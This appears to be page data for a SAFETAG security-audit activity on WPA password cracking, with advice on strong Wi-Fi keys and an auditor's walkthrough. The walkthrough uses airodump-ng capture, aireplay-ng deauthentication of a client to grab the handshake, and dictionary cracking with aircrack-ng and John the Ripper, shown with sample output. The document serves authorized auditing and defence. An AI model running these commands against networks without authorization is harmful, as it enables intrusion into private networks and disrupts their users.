{"componentChunkName":"component---src-components-layouts-activity-layout-js","path":"/activities/wpa_password_cracking","result":{"data":{"file":{"childMarkdownRemark":{"frontmatter":{"title":"WPA Password Cracking","approaches":["Technical"],"authors":["SAFETAG"],"remote_options":["None"],"skills_required":["Wireless","Traffic Analysis","Password auditing"],"time_required_minutes":"240","organization_size_under":1000},"fields":{"frontmattermd":{"overview":null,"materials_needed":{"html":"<ul>\n<li>For the (most common) WPA password-based attacks, an already-prepared dictionary of words to use to attack the password will be required. See the <a href=\"https://LINKBEFORELAUNCH\">Appendix on Audit Preparation</a> for guidance on dictionary preparation.</li>\n</ul>"},"considerations":null,"recommendations":{"html":"<p>The WPA key should be long enough and complex enough to prevent both standard dictionary attacks and “brute-force attacks” in which clusters of powerful computers work in parallel to test every possible character combination. (We recommend 12 or more completely random characters or a passphrase that contains four or five—or more—relatively uncommon words.) The key should not contain common “phrases,” including number sequences, especially if they are related to the organization, its employees or its work. Choosing a strong WPA key is one of the most important steps toward defending an organization’s network perimeter from an adversary with the ability to spend some time in the vicinity of the offices. By extension, mitigating sthis vulnerability is critical to the protection of employees and partners (and confidential data) from the sort of persistent exposure that eventually brings down even the most well-secured information systems.</p>\n<p>Because shared keys inevitably end up being written on whiteboards, given to office visitors and emailed to partners, the WPA key should also be changed periodically. This does not have to happen frequently, but anything less than three or four times per year may be unsafe.\nAssets affected by this issue</p>"},"summary":{"html":"<p>The organization’s wireless Local Area Network (WLAN) protects the network and its users with WPA encryption. This is an important security measure, and a WPA-protected wireless network is much safer than an unencrypted “open” network or a WEP-protected network. (WEP is fundamentally flawed, and extremely simple attacks have been widely known for over a decade.) However, the ease with an attacker could guess the WPA key, or “WiFi password,” is a serious issue, particularly considering its importance as an essential perimeter control. An attacker who gains access to the wireless LAN immediately bypasses many protections that network administrators, and other users of the office network, often take for granted. Put another way, anyone able to guess the WPA key is immediately “inside the firewall.”</p>\n<p>Using a laptop and a wireless card with a standard, internal antenna (or using a customized smartphone or other small device), an attacker could easily position themselves close enough to the office to carry out the first phase of this attack, which would only take a few minutes. The second phase, which is supposed to be the difficult part, could take even less time. From the privacy of their own home or office, the attacker could use a minimally customized password dictionary to guess the WPA key .</p>\n<!--For reporting, needs time-to-break WPA password -->"},"walk_through":{"html":"<p>An attacker can crack the office’s WPA key in approximately with a short and minimally customized password dictionary based on open information about the organization and basic word collections.</p>\n<p><strong>Step 1:</strong> The attacker customizes their WiFi password dictionary, adding phrases related to the subject: organization name, street address, phone number, email domain, wireless network name, etc. Common password fragments are included, as well: qwerty, 12345, asdf and all four-digit dates back to the year 2001, for example, among others. The attacker may then add hundreds or thousands of words (in English and/or other relevant languages).</p>\n<p>See the <a href=\"https://safetag.org/activities/password_strength\">Password Strength Activity</a> for details on password dictionary building and usage.</p>\n<p><strong>Step 2:</strong> The attacker would then begin recording all (encrypted) wireless traffic associated with the organization’s access point:</p>\n<pre><code>$ sudo airodump-ng -c 1 --bssid 1A:2B:3C:4D:5E:6F -w sampleorg_airodump mon0\n\n CH  1 ][ Elapsed: 12 mins ][ 2012-01-23 12:34 ][ fixed channel mon0: -1\n BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID\n 1A:2B:3C:4D:5E:6F  -70 100    12345    43210    6   1  12e. WPA2 CCMP   PSK sampleorg\n BSSID              STATION            PWR   Rate    Lost  Packets  Probes\n 1A:2B:3C:4D:5E:6F  01:23:45:67:89:01    0    0e- 0e   186    12345\n 1A:2B:3C:4D:5E:6F  AB:CD:EF:AB:CD:EF    0    1e- 1      0     1234\n 1A:2B:3C:4D:5E:6F  AA:BB:CC:DD:EE:FF  -76    0e- 1      0     1122\n 1A:2B:3C:4D:5E:6F  A1:B2:C3:D4:E5:F6  -80    0e- 1      0     4321\n</code></pre>\n<p>wifite is also useful for this step, and claims to automatically de-auth (step 3).</p>\n<p><strong>Step 3:</strong> Next, the auditor forces a wireless client, possibly chosen at random, to disconnect and reconnect (an operation that is nearly always invisible to the user).</p>\n<p>In the example below, AB:CD:EF:AB:CD:EF is the MAC address of a laptop that was briefly disconnected in this way.</p>\n<pre><code>$ aireplay-ng -0 1 -a 1A:2B:3C:4D:5E:6F -c AB:CD:EF:AB:CD:EF mon0\n\n 15:54:48  Waiting for beacon frame (BSSID: 1A:2B:3C:4D:5E:6F) on channel -1\n 15:54:49  Sending 64 directed DeAuth. STMAC: [AB:CD:EF:AB:CD:EF] [ 5| 3 ACKs]\n</code></pre>\n<p>The goal of this step is to capture the cryptographic handshake that occurs when the targeted client reconnects. Try using different clients if the first one doesn't work, or try (physically) moving around.</p>\n<p>This handshake does not contain the WPA key itself, but once the the complete handshake process has been seen, the auditor (or a potential attacker) can leave the vicinity and run various password cracking tools to try and discover the password. While a complete password cracking tutorial is out of scope for SAFETAG documentation, below are three strategies:</p>\n<p><strong>Step 4:</strong> The auditor attempts to discover the WPA password.</p>\n<p>A good wordlist with a few tweaks tends to break an unforunate number of passwords.  Using a collection of all english words, all words from the language of the organization being audited, plus a combination of all these words, plus relevant keywords, addresses, and years tends to crack most wifi passwords.</p>\n<pre><code class=\"language-bash\">    $ aircrack-ng -w pwdpairs.txt -b 1A:2B:3C:4D:5E:6F sampleorg_airodump*.cap\n</code></pre>\n<p>For WPA captures, John can either feed in to an aircrack process or attack a capture directly.  For captures, you first have to convert the .cap file (from wireshark, wifite, airodump, etc.) to a format that John likes.  The Jumbo version we use has conversion tools for this available:</p>\n<pre><code class=\"language-bash\">  $wpapcap2john wpa.cap > crackme\n  $./john -w:password.lst -fo=wpapsk-cuda crackme\n</code></pre>"}}}}}},"pageContext":{"slug":"/activities/wpa_password_cracking"}},"staticQueryHashes":["3649515864","63159454"]}